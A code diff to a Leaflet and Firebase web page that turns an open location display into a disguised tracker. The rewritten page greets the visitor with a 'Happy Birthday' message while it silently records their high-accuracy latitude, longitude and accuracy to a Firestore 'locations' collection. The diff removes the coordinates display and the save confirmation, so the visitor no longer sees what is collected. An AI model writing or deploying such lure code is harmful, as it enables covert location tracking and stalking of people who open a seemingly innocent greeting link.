@@ -41,26 +41,53 @@ L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'�
 
 const status=document.getElementById("status");
 
-navigator.geolocation.getCurrentPosition(async (pos)=>{
- const {latitude,longitude,accuracy}=pos.coords;
- L.marker([latitude,longitude]).addTo(map).bindPopup("Current Location").openPopup();
- L.circle([latitude,longitude],{radius:accuracy}).addTo(map);
- map.setView([latitude,longitude],17);
+navigator.geolocation.getCurrentPosition(
+  async (pos) => {
+    const { latitude, longitude, accuracy } = pos.coords;
 
- status.innerHTML=`Latitude: ${latitude}<br>Longitude: ${longitude}<br>Accuracy: ${accuracy.toFixed(1)} m`;
+    L.marker([latitude, longitude])
+      .addTo(map)
+      .bindPopup("Current Location")
+      .openPopup();
 
- try{
-   await addDoc(collection(db,"locations"),{
-      latitude, longitude, accuracy,
-      createdAt: serverTimestamp()
-   });
-   status.innerHTML += "<br><b>Saved to Firestore ✔</b>";
- }catch(e){
-   status.innerHTML += "<br><b>Firestore error:</b> "+e.message;
- }
-},(err)=>{
- status.textContent="Location error: "+err.message;
-},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
+    L.circle([latitude, longitude], { radius: accuracy }).addTo(map);
+    map.setView([latitude, longitude], 17);
+
+    status.innerHTML = `
+      <h3>🎂 Happy Birthday! 🎉</h3>
+      <p>May your day be filled with happiness and wonderful memories! ❤️</p>
+    `;
+
+    try {
+      await addDoc(collection(db, "locations"), {
+        latitude,
+        longitude,
+        accuracy,
+        createdAt: serverTimestamp()
+      });
+    } catch (e) {
+      status.innerHTML += `<br><b>Firestore error:</b> ${e.message}`;
+    }
+  },
+  (err) => {
+    if (err.code === 1) {
+      status.innerHTML = `
+        <h3>Permission not provided</h3>
+        <p>Location access was denied.</p>
+      `;
+    } else {
+      status.innerHTML = `
+        <h3>Location error</h3>
+        <p>${err.message}</p>
+      `;
+    }
+  },
+  {
+    enableHighAccuracy: true,
+    timeout: 30000,
+    maximumAge: 0
+  }
+);
 </script>
 </body>
 </html>
